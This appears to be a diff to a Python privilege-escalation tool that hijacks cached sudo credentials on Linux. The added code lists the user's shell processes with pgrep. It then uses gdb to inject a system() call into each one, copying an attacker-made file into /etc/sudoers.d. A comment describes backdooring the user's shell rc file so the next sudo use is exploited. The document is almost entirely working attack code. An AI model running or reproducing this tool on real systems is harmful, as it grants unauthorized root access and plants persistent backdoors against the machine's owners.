@@ -3,6 +3,7 @@
 
 import os 
 import sys
+import getpass
 import argparse
 import subprocess
 from shutil import which
@@ -20,6 +21,20 @@ def gen_break_ticket_payload(disk_location):
             f.write(payload)
     except:
         print('Error writing payload')
+
+
+def get_pids():   
+    blacklist_pid = str(os.getppid())
+    if not check_bin('pgrep'):
+       print("no pgrep - havent switched to regex")
+       sys.exit()
+    pgrep = subprocess.Popen('pgrep \'^(ash|ksh|csh|dash|bash|zsh|tcsh|sh)$\' -u \"$(id -u)\"',
+        shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    out, err = pgrep.communicate()
+    pids = out.decode("utf-8").split('\n')[:-1]
+    if pids: 
+        pids.remove(blacklist_pid)
+    return pids
 
 
 def ptrace_check():
@@ -79,12 +94,15 @@ def inject(payload,pid,sudofile):
         sys.exit() 
     
     if not pid:
-        pid = 1
-
+        pids = get_pids()
+        
+    else:
+        pids = list(pid)
+     
     inject_payload = "-eval-command=\'call system(\"echo | sudo -S cp {} /etc/sudoers.d/{} 2>&1\")\'".format(payload, sudofile) 
-    for pid in pid:
-        gdb_line = 'gdb -q -n -p {} -batch {} >/dev/null 2>&1'.format(pid , inject_payload)  
-        print(gdb_line)   
+    for x in pids:
+        gdb_line = 'gdb -q -n -p {} -batch {} >/dev/null 2>&1'.format(x , inject_payload)  
+        print("Attempting to inject into: {}".format(x))   
         p = subprocess.Popen(gdb_line,
         shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         out, err = p.communicate()
@@ -96,10 +114,13 @@ def main(args):
     if not args.i:
         args.b = True
     
+    if not os.path.isfile(args.payload):
+        gen_break_ticket_payload(args.payload)
+    
+    
     # backdoor the rc file of the current user so the next 
     # time they run sudo 
     if args.b:  
-        gen_break_ticket_payload(args.payload)
         backdoor_rc(args.payload,args.f)
 
     if args.i:
